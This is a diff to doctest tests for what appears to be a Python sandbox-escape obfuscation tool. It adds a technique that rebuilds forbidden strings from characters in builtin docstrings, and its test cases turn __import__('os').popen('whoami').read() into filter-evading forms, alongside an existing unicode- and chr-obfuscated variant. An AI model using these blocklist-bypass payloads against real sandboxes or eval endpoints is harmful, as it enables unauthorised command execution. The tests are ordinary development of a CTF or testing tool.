@@ -173,6 +173,12 @@ def test_String():
 
     >>> _test("by_reverse", "'你好世界'", ["你好", ], "你好")
     '界世好你'[::-1]
+
+    >>> _test("by_doc_index", "'system'", ["'", '"'], "'|\\"")
+    (id.__doc__[38]+id.__doc__[18]+id.__doc__[38]+id.__doc__[2]+id.__doc__[1]+id.__doc__[68])
+
+    >>> _test("by_doc_index", "'system'", ["'", '"', "system", "id", "a", "b"], "'|\\"|system|id|a|b")
+    (dir.__doc__[19]+dir.__doc__[461]+dir.__doc__[19]+dir.__doc__[10]+dir.__doc__[8]+dir.__doc__[59])
     """
 
 
@@ -371,4 +377,7 @@ def test_Combo():
 
     >>> maps = {"Bypass_Name": ["by_unicode"], "Bypass_String": ["by_char", "by_char_add", "by_char_format"], "Bypass_Attribute": ["by_getattr"], "Bypass_Int": ["by_cal"],}; _test(..., "__import__('os').popen('whoami').read()", ["__", ".", "'", '"', "read", "chr", "0", "1"], r"__|\\.|'|\\\"|read|chr|0|1", maps=maps)
     getattr(getattr(_＿import_＿((𝒄hr(37)+𝒄hr(99))%(3*37)+(𝒄hr(37)+𝒄hr(99))%(5*23)),(𝒄hr(37)+𝒄hr(99))%(4*28)+(𝒄hr(37)+𝒄hr(99))%(3*37)+(𝒄hr(37)+𝒄hr(99))%(4*28)+(𝒄hr(37)+𝒄hr(99))%(9+92)+(𝒄hr(37)+𝒄hr(99))%(5*22))((𝒄hr(37)+𝒄hr(99))%(998-879)+(𝒄hr(37)+𝒄hr(99))%(9+95)+(𝒄hr(37)+𝒄hr(99))%(3*37)+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%(998-889)+(𝒄hr(37)+𝒄hr(99))%(9+96)),((𝒄hr(37)+𝒄hr(99))%(3*38)+(𝒄hr(37)+𝒄hr(99))%(9+92)+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%(8+92)))()
+
+    >>> maps = {"Bypass_String": ["by_doc_index"]}; _test(..., "__import__('os').popen('whoami').read()", ["'", '"', "os", "sys", "a", "b"], "os|sys|'|\\\"|a|b", maps=maps)
+    __import__((id.__doc__[20]+id.__doc__[38])).popen((dir.__doc__[44]+dir.__doc__[47]+dir.__doc__[5]+dir.__doc__[38]+dir.__doc__[59]+dir.__doc__[1])).read()
     """
